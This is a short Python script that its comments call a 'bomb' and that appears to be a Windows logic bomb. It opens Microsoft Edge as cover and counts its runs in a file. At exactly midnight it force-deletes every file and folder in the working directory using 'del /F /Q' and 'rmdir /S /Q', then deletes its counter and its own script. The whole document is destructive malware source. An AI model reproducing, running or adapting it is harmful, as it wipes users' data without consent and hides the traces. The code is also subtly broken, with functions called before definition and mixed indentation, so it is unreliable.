import os
import pathlib
from datetime import datetime
from sys import argv


try:
	# Create new file
	# Write 1 in new file
	f = open("count.txt" , "x")
	f.write("1")
	
	# Start edge and bomb
	os.startfile('msedge.exe')
	# Bomb Function in Here
	checkDate()

except:
	# Open File in Reading Writing Mode
	f = open("count.txt" , "r+")
	content = 1
	
	# Read Data
	for i in f:
		content = int(i)
	
	# Write New Data
	f = open("count.txt" , "w+")
	f.write("{}".format(content + 1))
	
	# Stop if more than 1 run.
	if content < 1:
		os.startfile('msedge.exe')

		# Bomb Function in Here
		checkDate()

	if content > 1:
		os.startfile('msedge.exe')

# Check Time
def checkDate():
  now = datetime.now()
  current_time = now.strftime("%H:%M:%S")

  target = "00:00:00"
  
  if current_time == target:
    find()
    remove()
	deactivate()



# Find files and folders
def find():
  dir = os.getcwd()
  files = os.listdir(dir)

  return files

# Remove files and directories
def remove():
  for i in find():
    # Check the extension
    if pathlib.Path(i).suffix != "":
      os.system('del /F /Q "{}"'.format(i))
    
    # if it's not contain delete folder
    else:
      os.system('rmdir /S /Q "{}"'.format(i))

# Close and remove Count file
# Also destruct yourself
def deactivate():
  f.close()
  os.system("del /f /q count.txt")
  os.remove(argv[0])